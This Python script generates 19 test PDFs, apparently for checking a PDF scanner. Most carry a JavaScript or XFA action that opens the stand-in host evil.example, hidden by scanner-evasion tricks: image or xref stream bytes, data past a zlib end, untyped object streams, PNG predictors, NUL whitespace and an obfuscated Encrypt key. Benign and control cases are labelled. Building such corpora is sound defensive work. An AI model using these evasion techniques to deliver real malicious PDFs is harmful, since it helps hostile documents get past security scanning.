import sys, zlib
out = sys.argv[1]
JS = b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.launchURL\\('https://evil.example/x'\\)) >> >>"
PAGES = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
PAGE = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>"
def build(objs, trailer_extra=b"", root=1, extra_offsets=None, tail=b""):
    """objs: list of (num, bytes-body-after-'N 0 obj ') ; returns pdf with classic xref."""
    b = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offs = {}
    for num, body in objs:
        offs[num] = len(b)
        b += b"%d 0 obj\n" % num + body + b"\nendobj\n"
    if extra_offsets:
        for num, (marker, base_num) in extra_offsets.items():
            offs[num] = b.index(marker)
    n = max(offs) + 1
    x = len(b)
    b += b"xref\n0 %d\n0000000000 65535 f \n" % n
    for i in range(1, n):
        b += (b"%010d 00000 n \n" % offs[i]) if i in offs else b"0000000000 65535 f \n"
    b += b"trailer\n<< /Size %d /Root %d 0 R %s>>\nstartxref\n%d\n%%%%EOF\n" % (n, root, trailer_extra, x)
    return bytes(b) + tail
def stream(dict_inner, data):
    return b"<< " + dict_inner + b" /Length %d >>\nstream\n" % len(data) + data + b"\nendstream"
def w(name, data): open(f"{out}/{name}.pdf", "wb").write(data)
base = [(2, PAGES), (3, PAGE)]
# 1 baseline: direct JS catalog
w("01-direct-js", build([(1, JS)] + base))
# 2 catalog hidden in raw image stream bytes, xref points into it; '6 %\n0 obj' dodges the span regex
hidden = b"6 %c\n0 obj " + JS.replace(b"/Pages 2 0 R", b"/Pages 2 0 R") + b"\n"
img = stream(b"/Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8", b"\x00" * 8 + hidden)
w("02-hide-in-image", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, img)] + base, root=6, extra_offsets={6: (b"6 %c", 5)}))
# 3 hidden after the zlib end inside a Flate content stream
fl = stream(b"/Filter /FlateDecode", zlib.compress(b"BT ET") + b"\n" + hidden)
w("03-hide-after-zlib", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, fl)] + base, root=6, extra_offsets={6: (b"6 %c", 5)}))
# 4 ObjStm without /Type /ObjStm, marked /Length1 (font-program-looking): catalog inside
os_body = b"1 0 " + JS
osd = stream(b"/N 1 /First 4 /Length1 10 /Filter /FlateDecode", zlib.compress(os_body))
w("04-objstm-untyped-length1", build([(7, osd)] + base, root=2))
# 5 typed ObjStm with action (control: must be unsafe)
osd = stream(b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", zlib.compress(os_body))
w("05-objstm-typed", build([(7, osd)] + base, root=2))
# 6 typed ObjStm with an image codec filter (pixels skipped): CCITT/JBIG2 are lossless bilevel and can carry arbitrary bytes
osd = stream(b"/Type /ObjStm /N 1 /First 4 /Filter /CCITTFaxDecode /DecodeParms << /K -1 /Columns 64 >>", b"\x00\x10\x01")
w("06-objstm-ccitt", build([(7, osd)] + base, root=2))
# 7 typed ObjStm, Flate + PNG predictor: scanner reads the predicted bytes
def png_predict(data, cols):
    rows=[data[i:i+cols].ljust(cols,b' ') for i in range(0,len(data),cols)]
    res=bytearray(); prev=bytes(cols)
    for r in rows:
        best=None
        for t in (0,1,2):
            if t==0: enc=bytes(r)
            elif t==1: enc=bytes([(r[i]-(r[i-1] if i else 0))&255 for i in range(cols)])
            else: enc=bytes([(r[i]-prev[i])&255 for i in range(cols)])
            if b'/' not in enc and b'(' not in enc and t!=0: best=(t,enc);break
        if best is None: best=(1,bytes([(r[i]-(r[i-1] if i else 0))&255 for i in range(cols)]))
        res+=bytes([best[0]])+best[1]; prev=r
    return bytes(res)
cols=4
pred=png_predict(os_body, cols)
osd = stream(b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /DecodeParms << /Predictor 12 /Columns %d >>" % cols, zlib.compress(pred))
w("07-objstm-predictor", build([(7, osd)] + base, root=2))
# 8 LZW, 9 RunLength, 10 nested filter arrays, 11 indirect Length, 12 Encrypt
w("08-lzw", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, stream(b"/Filter /LZWDecode", b"\x80\x0b\x60\x50"))] + base))
w("09-runlength", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, stream(b"/Filter /RunLengthDecode", b"\x04BT ET\x80"))] + base))
w("10-nested-filters", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, stream(b"/Filter [/ASCIIHexDecode [/FlateDecode]]", b"41>"))] + base))
data = zlib.compress(JS)
ind = b"<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length 9 0 R >>\nstream\n" + zlib.compress(os_body) + b"\nendstream"
w("11-indirect-length", build([(7, ind), (9, b"%d" % len(zlib.compress(os_body)))] + base, root=2))
w("12-encrypt", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (8, b"<< /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >>")] + base, trailer_extra=b"/Encr#79pt 8 0 R "))
# 13 incremental update: second body + trailer appends a catalog with an OpenAction
first = build([(1, b"<< /Type /Catalog /Pages 2 0 R >>")] + base)
upd = b"1 0 obj\n" + JS + b"\nendobj\nxref\n1 1\n%010d 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R /Prev 0 >>\nstartxref\n0\n%%%%EOF\n" % len(first)
w("13-incremental", first + upd)
# 14 XFA form with a script (no PDF action name)
xfa = b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><subform><event activity="initialize"><script contentType="application/x-javascript">xfa.host.gotoURL("https://evil.example/x")</script></event></subform></template></xdp:xdp>'
w("14-xfa", build([(1, b"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [] /XFA 5 0 R /NeedsRendering true >> >>"), (5, stream(b"", xfa))] + base))
# 15 URL filespec, /F before /FS
w("15-filespec-order", build([(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /Rendition /OP 0 /R << /S /MR /C << /S /MCD /D << /Type /Filespec /F (https://evil.example/v.mp4) /FS /URL >> /CT (video/mp4) >> >> >> >>")] + base))
# 16 hidden object in a /Type /XRef stream's bytes
xr = stream(b"/Type /XRef /Size 1 /W [1 2 1]", b"\x00\x00\x00\x00" + hidden)
w("16-hide-in-xrefstream", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, xr)] + base, root=6, extra_offsets={6: (b"6 %c", 5)}))
# 17 NUL as white space between number and obj
hidden2 = b"6\x000\x00obj " + JS + b"\n"
img2 = stream(b"/Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8", hidden2)
w("17-nul-whitespace-image", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (5, img2)] + base, root=6, extra_offsets={6: (b"6\x000", 5)}))
# 18 honest-ish: Info title containing the word stream
w("18-title-stream", build([(1, b"<< /Type /Catalog /Pages 2 0 R >>"), (4, b"<< /Title (Live stream report) >>")] + base, trailer_extra=b"/Info 4 0 R "))
# 19 indirect OpenAction to a page destination (honest)
w("19-openaction-dest", build([(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>"), (4, b"[3 0 R /Fit]")] + base))
